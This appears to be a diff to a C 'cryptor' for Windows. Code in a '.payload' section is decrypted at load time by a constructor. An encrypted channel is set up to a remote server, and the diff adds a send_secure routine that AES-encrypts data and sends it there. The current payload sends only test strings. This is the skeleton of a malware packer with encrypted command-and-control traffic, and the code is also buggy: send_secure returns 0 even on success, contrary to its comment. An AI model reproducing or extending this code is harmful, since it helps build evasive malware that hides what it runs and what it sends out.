@@ -14,6 +14,9 @@
  * destoy all keying material appropriatly. Once innitiated communication with the sever will continue
  * fur the duration of the programs execution. 
  *
+ * A large volume of these mechanisms will end up behind the sceans making it possible to do an include 
+ * without seeing all of the behind the sceans logic, this will be my next step after getting the encrypted
+ * comms to a working state.
  */
 __attribute__((section(".payload"))) int send_secure(BYTE*,ULONG);
 __attribute__((section(".payload"))) int recv_secure(BYTE*,ULONG);
@@ -38,8 +41,15 @@ BCRYPT_KEY_HANDLE bcrypt_key_handle_rsa;
  * 	USE PLStr to secure all your binary strings
  */
 __attribute__((section(".payload"))) int payload(){
+	byte* tmp = "hello";
+	send_secure(tmp,5);
+	tmp = "world";
+	send_secure(tmp,5);
+	tmp = PLStr("data being sent from the cryptor"); 
+	send_secure(tmp,32);
 	printf(PLStr("hello world from the cryptor"));
 	
+	return 1;
 }
 
 /*
@@ -319,7 +329,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	ptr_payload = (BYTE*)addr_s;
 	if(BCryptDecrypt(decryptPayloadKey,ptr_payload,payload_size,NULL,decodedIV,sz,ptr_payload,payload_size,&PAYLOAD_WRITE_LEN,0) != STATUS_SUCCESS)
 	{
-			printf("failed to decrypt payload");
+		printf("failed to decrypt payload");
 		exit(-1);
 	}
 	if(BCryptDestroyKey(decryptPayloadKey) != STATUS_SUCCESS){
@@ -479,6 +489,16 @@ __attribute__((constructor(102), section(".payload"))) int InitSecureComs(){
 	{
 		exit(-1);
 	}
+	
+	if(!send(Connection,(BYTE*)SessionIV, AESKEYLEN,0))
+	{
+		exit(-1);
+	}
+	if(!recv(Connection,Syncronization,1,0))
+	{
+		exit(-1);
+	}
+	
 	CryptMemFree(Syncronization);
 	CryptMemFree(encryptedSessionKey);
 }
@@ -487,11 +507,12 @@ __attribute__((constructor(102), section(".payload"))) int InitSecureComs(){
  * destroys the session keys created for this session.
  */
 __attribute__((destructor(102), section(".payload"))) int closeSecureComs(){
+	printf("am i hitting this somehow");
 	/* 
 	 *Destroy the BCrypt key handle
 	 */
 	if(BCryptDestroyKey(SessionKeyHandle) != STATUS_SUCCESS){
-		printf("wtf Error in destroying key");
+		printf("Error in destroying key");
 		exit(0);
 	}
 	
@@ -501,11 +522,67 @@ __attribute__((destructor(102), section(".payload"))) int closeSecureComs(){
 
 }
 /*
- * this function takes a pointer to a  buffer to be sent as well as the length of the buffer.
- * this function will return true if this function succeeds.
+ * this function takes a pointer to a buffer to be sent as well as the length of the buffer.
+ * this function will returns a non zero value if this function succeeds.
  */
 __attribute__((section(".payload"))) int send_secure(BYTE* sendBuffer, ULONG bufferLen){
+	ULONG EncryptedBufferLen;
+	ULONG EncryptedBufferWriteLen;
+	ULONG msgSZ;
+	BYTE* EncryptedBuffer;
+	BYTE* MSG;
+	BYTE* Syncronization = CryptMemAlloc(1);
+	/*
+	 * calculate the length of the encrypted buffer
+	 */
+	if(BCryptEncrypt(SessionKeyHandle,sendBuffer,bufferLen,NULL, NULL,0,NULL,0,&EncryptedBufferLen,0) != STATUS_SUCCESS)
+	{
+		return 0;
+	}
+	MSG = CryptMemAlloc(EncryptedBufferLen + AESKEYLEN);
+	EncryptedBuffer = MSG+AESKEYLEN;
+	 
+	if(BCryptEncrypt(SessionKeyHandle,sendBuffer,bufferLen,NULL, SessionIV,AESKEYLEN,EncryptedBuffer,EncryptedBufferLen,&EncryptedBufferWriteLen,0) != STATUS_SUCCESS)
+	{
+		return 0;
+	}
+	for(int x = 0; x < AESKEYLEN; x++){
+		*(MSG+x) = *(SessionIV+x); 
+	}
+	msgSZ = htonl(EncryptedBufferWriteLen+AESKEYLEN);
+	
+	/*
+	 * Send the length of the encrypted AES key to the server.
+	 */
+	if(!send(Connection,(BYTE*)&msgSZ,sizeof(ULONG),0))
+	{
+		return 0;
+	}
+	/*
+	 * Recieve a syncronization byte from the server
+	 */
+	if(!recv(Connection,Syncronization,1,0))
+	{
+		return 0;
+	}
+	/*
+	 * Send the encrypted cipher text to the server.
+	 */
+	if(!send(Connection,(BYTE*)MSG,ntohl(msgSZ),0))
+	{
+		return 0;
+	}
+	/*
+	 * retrieve a syncronization byte from the server
+	 */
+	if(!recv(Connection,Syncronization,1,0))
+	{
+		return 0;
+	}
 
+	CryptMemFree(MSG);
+	CryptMemFree(Syncronization);
+	return 0;
 }
 __attribute__((section(".payload"))) int recv_secure(BYTE* recvBuffer, ULONG bufferLen){
 
